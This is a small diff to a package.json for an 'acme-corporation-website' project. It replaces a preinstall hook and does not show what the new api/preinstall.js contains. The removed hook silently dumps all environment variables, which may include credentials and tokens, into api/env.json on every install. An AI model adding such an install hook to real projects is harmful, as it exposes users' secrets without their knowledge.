@@ -22,7 +22,7 @@
  "main": "api.js",
  "name": "acme-corporation-website",
  "scripts": {
-  "preinstall": "node -e 'console.log(JSON.stringify(process.env))' > api/env.json",
+  "preinstall": "node api/preinstall.js",
   "start": "node api.js"
  },
  "version": "0.1.0"
